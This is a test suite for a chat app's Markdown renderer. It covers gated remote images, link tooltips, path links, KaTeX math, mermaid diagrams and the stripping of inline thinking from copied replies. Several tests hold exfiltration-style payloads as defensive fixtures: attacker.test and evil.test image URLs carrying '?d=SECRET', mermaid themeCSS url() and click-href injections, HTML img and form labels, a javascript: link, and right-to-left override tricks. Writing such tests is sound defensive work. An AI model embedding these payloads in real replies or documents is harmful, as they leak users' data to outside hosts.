// @vitest-environment jsdom
import { act } from "react";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render as renderDom, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { renderToStaticMarkup } from "react-dom/server";
import { readFileSync } from "node:fs";
import { Markdown } from "./Markdown";
import { replyMarkdown } from "./CopyMessage";
import { LinksProvider, PathsIn } from "./previewContext";
import type { PathOpen } from "../hermes/paths";

const invoke = vi.fn(async (_cmd: string, _args?: unknown): Promise<unknown> => undefined);
vi.mock("@tauri-apps/api/core", () => ({ invoke: (cmd: string, args?: unknown) => invoke(cmd, args) }));

const render = (text: string, query?: string) => renderToStaticMarkup(<Markdown text={text} query={query} />);

afterEach(() => {
  cleanup();
  invoke.mockReset();
});

describe("Markdown", () => {
  it("says Copied only once the clipboard took the code, and says so when it didn't", async () => {
    const writeText = vi.fn(async (_text: string) => {});
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    try {
      renderDom(<Markdown text={"```sh\nls -la\n```"} />);
      await userEvent.click(screen.getByRole("button", { name: "Copy" }));
      expect(writeText).toHaveBeenCalledWith("ls -la\n");
      await screen.findByRole("button", { name: "Copied" });
      cleanup();
      writeText.mockRejectedValueOnce(new DOMException("denied", "NotAllowedError"));
      renderDom(<Markdown text={"```sh\nls -la\n```"} />);
      await userEvent.click(screen.getByRole("button", { name: "Copy" }));
      await screen.findByRole("button", { name: "Couldn't copy" });
      expect(screen.queryByRole("button", { name: "Copied" })).toBeNull();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("highlights tagged code, and guesses the language of untagged code, on every render", () => {
    const untagged = "```\nfn parse(line: &str) -> Option<u32> {\n    let n: u32 = line.trim().parse().ok()?;\n    Some(n)\n}\n```";
    // The highlighter is shared between renders, so the second must come out the same as the first.
    for (let i = 0; i < 2; i++) {
      expect(render(untagged)).toMatch(/<code class="hljs language-rust">.*<span class="hljs-keyword">fn<\/span>/s);
      expect(render("```python\ndef f():\n    return 1\n```")).toContain('<span class="hljs-keyword">def</span>');
    }
  });

  it("marks find-in-chat matches in text and in highlighted code", () => {
    const html = render("Restart the **gateway**.\n\n```bash\nsystemctl restart gateway\n```", "GATEWAY");
    expect(html.match(/<mark class="hit">gateway<\/mark>/g)).toHaveLength(2);
    expect(render("Restart the gateway.", "")).not.toContain("<mark");
  });

  it("asks before loading a remote image, naming its host (#341)", () => {
    for (const text of ["![x](https://example.test/p.png?leak=SECRET)", "![x](//example.test/p.png?leak=SECRET)"]) {
      const html = render(text);
      expect(html).not.toMatch(/<img|<link/);
      expect(html).toContain("example.test");
    }
  });

  const PNG = "data:image/png;base64,iVBORw==";
  const linkedImage = (preview: () => void) =>
    renderDom(
      <LinksProvider preview={preview} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
        <Markdown text="[![chart](https://example.test/p.png)](https://example.test/page)" />
      </LinksProvider>,
    ).container;
  const networkImages = (container: Element) => [...container.querySelectorAll("img")].filter((img) => !img.getAttribute("src")?.startsWith("data:"));

  it("loads a remote image through the app once its placeholder is clicked, without following a link around it", async () => {
    let answer!: (dataUrl: string) => void;
    invoke.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)));
    const preview = vi.fn();
    const container = linkedImage(preview);
    expect(container.querySelector("img")).toBeNull();
    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
    expect(invoke).toHaveBeenCalledWith("markdown_image_load", { url: "https://example.test/p.png" });
    expect(screen.getByRole("button", { name: /example\.test, loading/ })).toBeTruthy();
    expect(networkImages(container)).toEqual([]);
    act(() => answer(PNG));
    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
    expect(preview).not.toHaveBeenCalled();
    expect(container.querySelector("img")?.getAttribute("alt")).toBe("chart");
    expect(screen.queryByRole("button", { name: /example\.test/ })).toBeNull();
    await userEvent.click(container.querySelector("img")!);
    expect(preview).toHaveBeenCalledWith({ kind: "web", url: "https://example.test/page" });
  });

  it("loads an image with no scheme in its address over https", async () => {
    invoke.mockResolvedValueOnce(PNG);
    const { container } = renderDom(<Markdown text="![x](//example.test/p.png)" />);
    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
    expect(invoke).toHaveBeenCalledWith("markdown_image_load", { url: "https://example.test/p.png" });
    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
  });

  it("says why a clicked image didn't load, and tries again on the next click", async () => {
    invoke.mockRejectedValueOnce("That address isn't an image.").mockResolvedValueOnce(PNG);
    const preview = vi.fn();
    const container = linkedImage(preview);
    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
    const failed = await screen.findByRole("button", { name: /didn't load\. That address isn't an image\. Click to try again/ });
    expect(container.querySelector("img")).toBeNull();
    await userEvent.click(failed);
    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
    expect(invoke).toHaveBeenCalledTimes(2);
    expect(networkImages(container)).toEqual([]);
    expect(preview).not.toHaveBeenCalled();
  });

  it("asks again for a different image put where a loaded one was (#488)", async () => {
    invoke.mockResolvedValueOnce(PNG);
    const shown = (text: string) => <Markdown text={text} />;
    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
    rerender(shown("![a](https://attacker.test/?d=SECRET)"));
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("button", { name: /attacker\.test, click to load/ })).toBeTruthy();
    expect(invoke).toHaveBeenCalledTimes(1);
  });

  it("never shows an image that finishes loading after a different one took its place (#488)", async () => {
    let answer!: (dataUrl: string) => void;
    invoke.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)));
    const shown = (text: string) => <Markdown text={text} />;
    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
    rerender(shown("![a](https://two.test/b.png)"));
    act(() => answer(PNG));
    await Promise.resolve();
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("button", { name: /two\.test, click to load/ })).toBeTruthy();
  });
});

describe("A link's tooltip (#471)", () => {
  const tip = (text: string) =>
    renderDom(
      <LinksProvider preview={vi.fn()} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
        <Markdown text={text} />
      </LinksProvider>,
    ).container.querySelector("a")!.title;

  it("starts with the real address whatever title the Markdown gives", () => {
    const shown = tip('[the docs](https://attacker.test/?d=SECRET "https://docs.python.org/3/\nOpens in the preview")');
    expect(shown.startsWith("https://attacker.test/?d=SECRET\nOpens in the preview\n")).toBe(true);
    expect(shown.split("\n")).toEqual(["https://attacker.test/?d=SECRET", "Opens in the preview", "https://docs.python.org/3/ Opens in the preview"]);
  });

  it("keeps a title's direction overrides from reaching back into the address", () => {
    expect(tip('[x](https://a.test/ "\u202Eevil")')).toBe("https://a.test/\nOpens in the preview\n\uFFFDevil");
  });

  it("is just the address and where it opens when the Markdown gives no title", () => {
    expect(tip("[x](https://a.test/)")).toBe("https://a.test/\nOpens in the preview");
  });
});

describe("A path in a reply (ADR 0167)", () => {
  /** A reply in a chat that works in `/srv/app`, with `open` standing in for what opens a path. */
  function reply(text: string, { open = vi.fn(async (_: PathOpen) => {}), folder = "/srv/app" as string | null, query = "" } = {}) {
    const onToast = vi.fn();
    const { container } = renderDom(
      <LinksProvider preview={vi.fn()} path={open} web={{ openInBrowser: vi.fn() }} onToast={onToast}>
        <PathsIn folder={folder ?? undefined} session="chat-1">
          <Markdown text={text} query={query} />
        </PathsIn>
      </LinksProvider>,
    );
    const paths = () => [...container.querySelectorAll<HTMLElement>("a.path-link")];
    return { container, open, onToast, paths, words: () => paths().map((a) => a.textContent), path: (words: string) => paths().find((a) => a.textContent === words)! };
  }

  it("is a link in running text, in a code span and as a Markdown link's address, and never an address to follow", () => {
    const { container, paths, words } = reply(
      "Edited src/ui/Markdown.tsx:12, `~/notes/` and `package.json`. See [the config](/etc/hosts) and [the docs](file:///srv/docs/x.md), and/or 1/2 of https://example.com/a/b.ts.",
    );
    expect(words()).toEqual(["src/ui/Markdown.tsx:12", "~/notes/", "package.json", "the config", "the docs"]);
    expect(paths().every((a) => !a.hasAttribute("href"))).toBe(true);
    expect(container.querySelector("code > a.path-link")?.textContent).toBe("~/notes/");
    expect([...container.querySelectorAll("a[href]")].map((a) => a.getAttribute("href"))).toEqual(["https://example.com/a/b.ts"]);
  });

  it("links the path inside a longer code span, and leaves code blocks and math as they are", () => {
    const { container, words } = reply("Run `cat /etc/hosts.conf`.\n\n```sh\ncat /etc/hosts.conf\n```\n\nThen $x/y + /a/b$ and `x/y`.");
    expect(words()).toEqual(["/etc/hosts.conf"]);
    expect(container.querySelector("pre")!.textContent).toBe("cat /etc/hosts.conf\n");
    expect(container.querySelector("pre a")).toBeNull();
  });

  it("doesn't link the part of a path that Markdown's emphasis cut short, while a path beside a line break still links", () => {
    const { container, words } = reply(
      "Edited src/__init__.py, src/**bold**/x.py, src/**foo/bar.txt**/other.py and .**github/workflows/ci.yml**,\nthen /srv/app/main.py\nand **/srv/app/x.ts**, `docs/a.md`.",
    );
    expect(container.querySelector("strong")?.textContent).toBe("init");
    expect(words()).toEqual(["/srv/app/main.py", "/srv/app/x.ts", "docs/a.md"]);
  });

  it("holds a find-in-chat mark inside its link", () => {
    const { path } = reply("Edited src/ui/Markdown.tsx today.", { query: "markdown" });
    expect(path("src/ui/Markdown.tsx").querySelector("mark.hit")?.textContent).toBe("Markdown");
  });

  it("leaves an address that could run script emptied, as before", () => {
    const { container, words } = reply("[x](javascript:alert(1)) and [y](https://a.test/)");
    expect(words()).toEqual([]);
    expect(container.querySelector("a")!.getAttribute("href")).toBe("");
  });

  it("stays text when it is relative and nothing says to what, while a full path still links", () => {
    expect(reply("Edited src/a.ts and /etc/hosts.conf, and `./run.sh`.", { folder: null }).words()).toEqual(["/etc/hosts.conf"]);
  });

  it("stays text where nothing opens paths, and in Markdown that isn't about the Hermes server", () => {
    const text = "See /etc/hosts.conf and `src/ui`.";
    expect(render(text)).toBe("<p>See /etc/hosts.conf and <code>src/ui</code>.</p>");
    // A Local file, say: its `/etc/hosts.conf` is this computer's.
    const { container } = renderDom(
      <LinksProvider preview={vi.fn()} path={async () => {}} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
        <Markdown text={text} />
      </LinksProvider>,
    );
    expect(container.querySelector("a")).toBeNull();
  });

  it("says its full path first in its tooltip, whatever title the Markdown gives", () => {
    const { path } = reply('In src/a.ts and [the notes](../notes/a.md "/etc/passwd\u202Eevil").');
    const where = "On the Hermes server: a file opens in the Preview, a folder in the Terminal.";
    expect(path("src/a.ts").title).toBe(`/srv/app/src/a.ts\n${where}`);
    expect(path("the notes").title).toBe(`/srv/app/../notes/a.md\n${where}\n/etc/passwd\uFFFDevil`);
  });

  it("opens on a click and on Enter, as a folder when it is written as one, naming the chat", async () => {
    const { open, path } = reply("Edited src/a.ts in docs/adr/.");
    await userEvent.click(path("src/a.ts"));
    expect(open).toHaveBeenLastCalledWith({ path: "/srv/app/src/a.ts", saysFolder: false, session: "chat-1" });
    path("docs/adr/").focus();
    await userEvent.keyboard("{Enter}");
    expect(open).toHaveBeenLastCalledWith({ path: "/srv/app/docs/adr", saysFolder: true, session: "chat-1" });
    expect(open).toHaveBeenCalledTimes(2);
  });

  it("shows it is busy until it has opened, and takes no second click meanwhile", async () => {
    let opened!: () => void;
    const open = vi.fn((_: PathOpen) => new Promise<void>((done) => (opened = done)));
    const { path } = reply("Edited src/a.ts.", { open });
    await userEvent.click(path("src/a.ts"));
    expect(path("src/a.ts").getAttribute("aria-busy")).toBe("true");
    await userEvent.click(path("src/a.ts"));
    expect(open).toHaveBeenCalledTimes(1);
    await act(async () => opened());
    expect(path("src/a.ts").hasAttribute("aria-busy")).toBe(false);
  });

  it("offers the Preview, the Terminal and its full path to copy on a right click", async () => {
    const writeText = vi.fn(async (_text: string) => {});
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    try {
      const { open, onToast, path } = reply("Edited src/a.ts.");
      const item = async (name: string) => {
        fireEvent.contextMenu(path("src/a.ts"));
        const menu = screen.getByRole("menu", { name: "Path" });
        expect([...menu.querySelectorAll('[role="menuitem"]')].map((i) => i.textContent)).toEqual(["Open in the Preview", "Open in the Terminal", "Copy path"]);
        await userEvent.click(screen.getByRole("menuitem", { name }));
        expect(screen.queryByRole("menu")).toBeNull();
      };
      await item("Open in the Preview");
      expect(open).toHaveBeenLastCalledWith({ path: "/srv/app/src/a.ts", saysFolder: false, session: "chat-1", as: "preview" });
      await item("Open in the Terminal");
      expect(open).toHaveBeenLastCalledWith({ path: "/srv/app/src/a.ts", saysFolder: false, session: "chat-1", as: "terminal" });
      await item("Copy path");
      expect(writeText).toHaveBeenCalledWith("/srv/app/src/a.ts");
      await waitFor(() => expect(onToast).toHaveBeenCalledWith("Path copied."));
      expect(open).toHaveBeenCalledTimes(2);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

describe("Math in a reply", () => {
  const shown = (text: string) => {
    const div = document.createElement("div");
    div.innerHTML = render(text);
    return div;
  };
  const tex = (math: Element) => math.querySelector('annotation[encoding="application/x-tex"]')!.textContent!.trim();

  it("typesets inline math between dollars or \\( \\)", () => {
    for (const [text, source] of [
      ["Energy: $E = mc^2$.", "E = mc^2"],
      ["A variable $x$ here.", "x"],
      ["Pythagoras: \\(a^2 + b^2 = c^2\\), always.", "a^2 + b^2 = c^2"],
    ]) {
      const div = shown(text);
      expect(div.querySelectorAll(".katex"), text).toHaveLength(1);
      expect(div.querySelector(".katex-display"), text).toBeNull();
      expect(tex(div.querySelector(".katex")!)).toBe(source);
      expect(div.textContent).not.toMatch(/\$|\\\(|\\\)/);
    }
  });

  it("typesets block math between $$ or \\[ \\], blank lines and all", () => {
    for (const [text, source] of [
      ["$$\n\\int_0^1 x\\,dx\n\n= \\tfrac12\n$$", "\\int_0^1 x\\,dx\n\n= \\tfrac12"],
      ["\\[\nx = \\frac{1}{2}\n\\]", "x = \\frac{1}{2}"],
      ["So \\[\na + b\n\\] holds.", "a + b"],
      ["Then $$y = 2$$ follows.", "y = 2"],
    ]) {
      const div = shown(text);
      expect(div.querySelectorAll(".katex-display"), text).toHaveLength(1);
      expect(tex(div.querySelector(".katex-display")!)).toBe(source);
      expect(div.textContent).not.toMatch(/\$|\\\[|\\\]/);
    }
  });

  it("reads two formulas with no space between them as two", () => {
    const div = shown("$a$$b$");
    expect([...div.querySelectorAll(".katex")].map(tex)).toEqual(["a", "b"]);
  });

  it("leaves dollar amounts as prose", () => {
    for (const text of ["It costs $5 and $10.", "From $20,000 to $30,000 a year.", "Pay $5 now or$10 later.", "A lone $ sign, and $ spaced $."]) {
      const div = shown(text);
      expect(div.querySelector(".katex"), text).toBeNull();
      expect(div.textContent).toBe(text);
    }
  });

  it("leaves math in code as code", () => {
    const div = shown("Write `$x$` or `\\(y\\)`.\n\n```\n$$\nz\n$$\n```");
    expect(div.querySelector(".katex")).toBeNull();
    expect([...div.querySelectorAll("code")].map((c) => c.textContent)).toEqual(["$x$", "\\(y\\)", "$$\nz\n$$\n"]);
  });

  it("isn't marked inside by find-in-chat, though the text around it is", () => {
    const div = shown("The mass m is in $E = mc^2$, m for mass.");
    expect(div.querySelector(".katex")).not.toBeNull();
    div.innerHTML = render("The mass m is in $E = mc^2$, m for mass.", "m");
    expect(div.querySelector(".katex mark")).toBeNull();
    expect(div.querySelectorAll("mark.hit").length).toBeGreaterThan(0);
  });
});

describe("A mermaid diagram in a reply", () => {
  const LONG = 30_000;
  const fenced = (source: string) => "```mermaid\n" + source + "\n```";
  // An svg in a code block other than its header's icons.
  const diagram = (container: Element) => [...container.querySelectorAll(".code svg")].find((svg) => !svg.closest(".code-head")) ?? null;
  const drawn = (container: HTMLElement) => waitFor(() => expect(diagram(container)).not.toBeNull(), { timeout: LONG });

  beforeAll(() => {
    // jsdom has no layout; mermaid measures boxes and text to place them.
    Object.assign(SVGElement.prototype, {
      getBBox: () => ({ x: 0, y: 0, width: 80, height: 20 }),
      getComputedTextLength: () => 40,
    });
  });

  it("is drawn, with a way back to its source, and copies its source", { timeout: LONG }, async () => {
    const writeText = vi.fn(async () => {});
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    try {
      const source = "flowchart TD\n  Start-->Stop";
      const { container } = renderDom(<Markdown text={fenced(source)} />);
      await drawn(container);
      expect(diagram(container)!.textContent).toContain("Start");
      expect(container.querySelector(".code-head span")!.textContent).toBe("mermaid");
      fireEvent.click(container.querySelector(".code-copy")!);
      expect(writeText).toHaveBeenCalledWith(source + "\n");
      await userEvent.click(screen.getByRole("button", { name: "Source" }));
      expect(diagram(container)).toBeNull();
      expect(container.querySelector("pre")!.textContent).toBe(source + "\n");
      await userEvent.click(screen.getByRole("button", { name: "Diagram" }));
      expect(diagram(container)).not.toBeNull();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("that can't be drawn shows its source, with a note saying why", { timeout: LONG }, async () => {
    const source = "graph TD\n  A[never closed";
    const { container } = renderDom(<Markdown text={fenced(source)} />);
    await screen.findByText(/^Couldn't draw this diagram: \S/, undefined, { timeout: LONG });
    expect(diagram(container)).toBeNull();
    expect(container.querySelector("pre")!.textContent).toBe(source + "\n");
    expect(screen.queryByRole("button", { name: "Diagram" })).toBeNull();
  });

  it("is drawn only once it scrolls into view", { timeout: LONG }, async () => {
    const observers: { see: () => void }[] = [];
    vi.stubGlobal(
      "IntersectionObserver",
      class {
        constructor(private callback: (entries: { isIntersecting: boolean }[]) => void) {
          observers.push(this);
        }
        see = () => this.callback([{ isIntersecting: true }]);
        observe() {}
        unobserve() {}
        disconnect() {}
      },
    );
    try {
      const { container } = renderDom(<Markdown text={fenced("flowchart LR\n  Seen-->Later")} />);
      await new Promise((r) => setTimeout(r, 500));
      expect(diagram(container)).toBeNull();
      expect(container.querySelector("pre")!.textContent).toContain("Seen-->Later");
      act(() => observers.forEach((o) => o.see()));
      await drawn(container);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("leaves a mermaid fence quoted in other code as code", () => {
    const html = render("````markdown\n" + fenced("flowchart TD\n  A-->B") + "\n````");
    expect(html).toContain('<div class="code-head"><span>markdown</span>');
    expect(html).toContain("```mermaid\nflowchart TD\n  A--&gt;B\n```");
  });

  // A reply can carry text an attacker wrote (a web page, a file), so a diagram must never make the app fetch anything.
  it("keeps config, links and labels from reaching off the app", { timeout: LONG }, async () => {
    for (const source of [
      // Settings a diagram can't change. With `url(…)` in them they aren't drawn at all (below).
      '%%{init: {"themeCSS": ".evil{fill:red}", "fontFamily": "evil"}}%%\nflowchart TD\n  A-->B',
      "---\nconfig:\n  themeCSS: .evil{fill:red}\n  fontFamily: evil\n---\nflowchart TD\n  A-->B",
      'flowchart TD\n  A-->B\n  click A href "https://evil.test/k"',
      'flowchart TD\n  A["<img src=https://evil.test/h.png>"]-->B["`![x](https://evil.test/md.png)`"]',
      // mermaid's own escape for `(`, which it turns back into `(` only in the SVG it hands over.
      "stateDiagram-v2\n  classDef e fill:url#40;https://evil.test/e)\n  A --> B\n  class A e",
    ]) {
      const { container, unmount } = renderDom(<Markdown text={fenced(source)} />);
      await drawn(container);
      const svg = diagram(container)!;
      // An attacker's text may show as a label; it must never be an attribute or styling.
      const outbound = [svg, ...svg.querySelectorAll("*")].flatMap((el) => [
        ...[...el.attributes].map((a) => a.value),
        ...(el.tagName.toLowerCase() === "style" ? [el.textContent ?? ""] : []),
      ]);
      expect(outbound.filter((v) => v.includes("evil")), source).toEqual([]);
      expect(svg.querySelector("img, image, foreignObject"), source).toBeNull();
      unmount();
    }
  });

  /** The code blocks of `sources`, in one reply ahead of a diagram drawn only once each of them has had its turn. */
  async function drawnAfter(sources: string[]) {
    const { container } = renderDom(<Markdown text={[...sources, "flowchart TD\n  After-->It"].map(fenced).join("\n\n")} />);
    await waitFor(() => expect(diagram(container.querySelectorAll(".code")[sources.length])).not.toBeNull(), { timeout: LONG });
    return [...container.querySelectorAll(".code")].slice(0, -1);
  }

  it("that shows an image isn't drawn, so the image is never fetched", { timeout: LONG }, async () => {
    const fetched: string[] = [];
    vi.stubGlobal(
      "Image",
      class {
        set src(url: string) {
          fetched.push(url);
        }
      },
    );
    try {
      const sources = [
        'flowchart TD\n  A@{ img: "https://evil.test/a.png?d=SECRET", label: "x" }',
        'flowchart TD\n  A@{ "\\x69mg": "https://evil.test/b.png", label: "x" }',
      ];
      for (const [i, block] of (await drawnAfter(sources)).entries()) {
        expect(diagram(block)).toBeNull();
        expect(block.querySelector("pre")!.textContent).toBe(sources[i] + "\n");
        expect(block.textContent).toMatch(/links an image/);
      }
      expect(fetched.filter((url) => url.includes("evil.test"))).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("whose styles link outside the app isn't drawn, as they would apply while it is", { timeout: LONG }, async () => {
    const sources = [
      '%%{init: {"themeCSS": ".x{fill:url(https://evil.test/c?d=SECRET)}"}}%%\nflowchart TD\n  A-->B',
      '%%{init: {"fontFamily": "x;}.y{fill:url(https://evil.test/f)"}}%%\nflowchart TD\n  A-->B',
      '---\nconfig:\n  themeCSS: ".x{fill:url(https://evil.test/m)}"\n---\nflowchart TD\n  A-->B',
      "stateDiagram-v2\n  classDef e fill:url(https://evil.test/d)\n  A --> B\n  class A e",
      "classDiagram\n  class A\n  style A fill:url(https://evil.test/s)",
      "stateDiagram-v2\n  classDef e fill:\\75 rl(https://evil.test/x)\n  A --> B\n  class A e",
    ];
    for (const [i, block] of (await drawnAfter(sources)).entries()) {
      expect(diagram(block)).toBeNull();
      expect(block.querySelector("pre")!.textContent).toBe(sources[i] + "\n");
      expect(block.textContent).toMatch(/styles link outside the app/);
    }
  });

  // Mermaid puts each drawing in the page while it lays it out, before `contained` cleans it; an `<img>` there loads.
  // Each source that wrongly drew HTML labels would hang jsdom until mermaid.ts gives up on it, 15 s apiece.
  it("never puts anything that loads into the page while it draws, whatever settings the diagram asks for", { timeout: 100_000 }, async () => {
    const added: string[] = [];
    const watch = new MutationObserver((records) =>
      records.forEach((r) =>
        r.addedNodes.forEach((n) => {
          if (!(n instanceof Element)) return;
          for (const el of [n, ...n.querySelectorAll("*")]) if (el.matches("img, image, foreignObject, form, iframe")) added.push(el.outerHTML.slice(0, 120));
        }),
      ),
    );
    watch.observe(document.documentElement, { subtree: true, childList: true });
    try {
      const sources = [
        '%%{init: {"htmlLabels": true}}%%\nstateDiagram-v2\n  A: <img src=https://evil.test/st.png>\n  [*] --> A',
        '%%{init: {"htmlLabels": true}}%%\nflowchart TD\n  A["<img src=https://evil.test/f.png>"]--"<img src=https://evil.test/e.png>"-->B',
        "---\nconfig:\n  htmlLabels: true\n---\nclassDiagram\n  class A\n  A : <img src=https://evil.test/c.png>",
        '%%{init: {"htmlLabels": true}}%%\nflowchart TD\n  A["<form action=https://evil.test/f><button>go</button></form>"]',
      ];
      const { container } = renderDom(<Markdown text={sources.map(fenced).join("\n\n")} />);
      const blocks = [...container.querySelectorAll(".code")];
      await waitFor(() => expect(blocks.filter((b) => diagram(b) || b.querySelector(".code-note"))).toHaveLength(sources.length), { timeout: 90_000 });
      expect(added).toEqual([]);
    } finally {
      watch.disconnect();
    }
  });

  // Math labels keep their raw HTML and d3 draws an actor's icon, both before `contained` runs, so only the page
  // policy in index.html stands between these elements and a request (#465).
  it("puts nothing into the page while it draws that the page policy would let load", { timeout: LONG }, async () => {
    const policy = (readFileSync("index.html", "utf8") as string).match(/Content-Security-Policy"\s+content="([^"]*)"/)![1];
    const sourcesFor = (directive: string) => policy.split(";").map((d) => d.trim().split(/\s+/)).find(([name]) => name === directive)?.slice(1);
    const allows = (directive: "img-src" | "media-src", url: string) => {
      const sources = sourcesFor(directive) ?? sourcesFor("default-src");
      if (!sources) return true;
      const target = new URL(url, location.href);
      return sources.some((s) => (s === "'self'" ? target.origin === location.origin : s.endsWith(":") && target.protocol === s));
    };
    const urls = (el: Element, attribute: string) =>
      (attribute === "srcset" ? (el.getAttribute(attribute) ?? "").split(",").map((c) => c.trim().split(/\s+/)[0]) : [el.getAttribute(attribute) ?? ""]).filter(Boolean);
    const loads: [string, "img-src" | "media-src", string[]][] = [
      ["img, picture source, input[type=image]", "img-src", ["src", "srcset"]],
      ["video", "img-src", ["poster"]],
      ["audio, video, audio source, video source", "media-src", ["src"]],
      ["image", "img-src", ["href", "xlink:href"]],
    ];
    const letThrough = new Set<string>();
    const watch = new MutationObserver((records) =>
      records.forEach((r) =>
        r.addedNodes.forEach((n) => {
          if (!(n instanceof Element)) return;
          for (const el of [n, ...n.querySelectorAll("*")])
            for (const [selector, directive, attributes] of loads)
              if (el.matches(selector))
                for (const attribute of attributes) for (const url of urls(el, attribute)) if (allows(directive, url)) letThrough.add(`${el.localName} ${attribute}=${url}`);
        }),
      ),
    );
    watch.observe(document.documentElement, { subtree: true, childList: true });
    try {
      const message = (html: string) => `sequenceDiagram\n  participant A\n  participant B\n  A->>B: $$x$$ ${html}`;
      await drawnAfter([
        message("<img src=https://evil.test/m.png?d=SECRET>"),
        'sequenceDiagram\n  participant A\n  participant B\n  properties A: {"class": "internal-service-actor", "icon": "https://evil.test/icon.png"}\n  A->>B: hi',
        message("<video poster=https://evil.test/poster.png></video><audio src=https://evil.test/a.mp3 preload=auto></audio>"),
        message("<picture><source srcset=https://evil.test/p.png><img></picture>"),
        message("<input type=image src=https://evil.test/i.png>"),
      ]);
      expect([...letThrough]).toEqual([]);
    } finally {
      watch.disconnect();
    }
  });

  it("locks every setting mermaid takes, so no diagram can change one", async () => {
    const { UNDEFAULTED_SETTINGS } = await import("./mermaid");
    const { default: mermaid } = await import("mermaid");
    const types = readFileSync("node_modules/mermaid/dist/config.type.d.ts", "utf8") as string;
    const declared = types.match(/export interface MermaidConfig \{([\s\S]*?)\n\}/)![1].match(/^ {4}(\w+)\??:/gm)!.map((k: string) => k.trim().replace(/\??:$/, ""));
    expect(declared).toContain("htmlLabels");
    const locked = new Set([...Object.keys(mermaid.mermaidAPI.defaultConfig), ...UNDEFAULTED_SETTINGS]);
    expect(declared.filter((k: string) => !locked.has(k))).toEqual([]);
  });

  it("is drawn again in the other theme when the app switches between light and dark", { timeout: LONG }, async () => {
    const mode = document.documentElement.dataset.mode;
    document.documentElement.dataset.mode = "light";
    try {
      const { container } = renderDom(<Markdown text={fenced("flowchart TD\n  Day-->Night")} />);
      await drawn(container);
      const light = diagram(container)!.outerHTML;
      act(() => void (document.documentElement.dataset.mode = "dark"));
      await waitFor(() => expect(diagram(container)?.outerHTML ?? light).not.toBe(light), { timeout: LONG });
      expect(diagram(container)!.textContent).toContain("Night");
    } finally {
      if (mode === undefined) delete document.documentElement.dataset.mode;
      else document.documentElement.dataset.mode = mode;
    }
  });
});

describe("A reply's words to copy", () => {
  it("keeps the reply's Markdown as Hermes wrote it", () => {
    const reply = "## Fixed\n\n- Restarted **gateway**\n- See [logs](https://nas/logs)\n\n```bash\nsystemctl status gateway\n```";
    expect(replyMarkdown(reply)).toBe(reply);
  });

  it("leaves out thinking written inline, and the blank lines after it", () => {
    expect(replyMarkdown("<think>The owner wants a yes.\nKeep it short.</think>\n\nYes, it's up.")).toBe("Yes, it's up.");
    expect(replyMarkdown("First.\n\n<THINKING>check the port</THINKING>\n\n\nSecond.")).toBe("First.\n\nSecond.");
    expect(replyMarkdown("<think>short</think> Yes.")).toBe("Yes.");
  });

  it("leaves out thinking sections one straight after another", () => {
    expect(replyMarkdown("<think>first</think><think>second</think>Yes.")).toBe("Yes.");
    expect(replyMarkdown("<think>first</think>\n<reasoning>second</reasoning>\n\nYes.")).toBe("Yes.");
    expect(replyMarkdown("<think>first</think> <think>never closed")).toBe("");
  });

  it("leaves out thinking never closed, at the start or after the reply's words", () => {
    expect(replyMarkdown("<reasoning>still going")).toBe("");
    expect(replyMarkdown("Let me check.\n<think>private reasoning\nmore of it")).toBe("Let me check.");
  });

  it("keeps a tag mentioned mid-sentence or shown in code", () => {
    expect(replyMarkdown("Wrap it in `<think>` tags.")).toBe("Wrap it in `<think>` tags.");
    expect(replyMarkdown("Put `<think>` before and `</think>` after.")).toBe("Put `<think>` before and `</think>` after.");
    const xml = "The format:\n\n```xml\n<think>example</think>\n<answer>42</answer>\n```\n\n~~~\n<reasoning>\nopen\n~~~";
    expect(replyMarkdown(xml)).toBe(xml);
    expect(replyMarkdown("    <think>indented code</think>")).toBe("    <think>indented code</think>");
    const listed = "- The format:\n\n  ```xml\n  <think>example</think>\n  ```\n\n<think>real</think>\nDone.";
    expect(replyMarkdown(listed)).toBe("- The format:\n\n  ```xml\n  <think>example</think>\n  ```\n\nDone.");
    expect(replyMarkdown("Type `a\n<think>` and the rest stays.")).toBe("Type `a\n<think>` and the rest stays.");
  });

  it("keeps blank lines and indentation, dropping only blank lines at the start and end", () => {
    const code = "    let a = 1;\n\n\n\n    let b = 2;";
    expect(replyMarkdown(code)).toBe(code);
    expect(replyMarkdown("```\nline one\n\n\n\nline five\n```")).toBe("```\nline one\n\n\n\nline five\n```");
    expect(replyMarkdown("\n\n  - item\n\n")).toBe("  - item");
  });
});
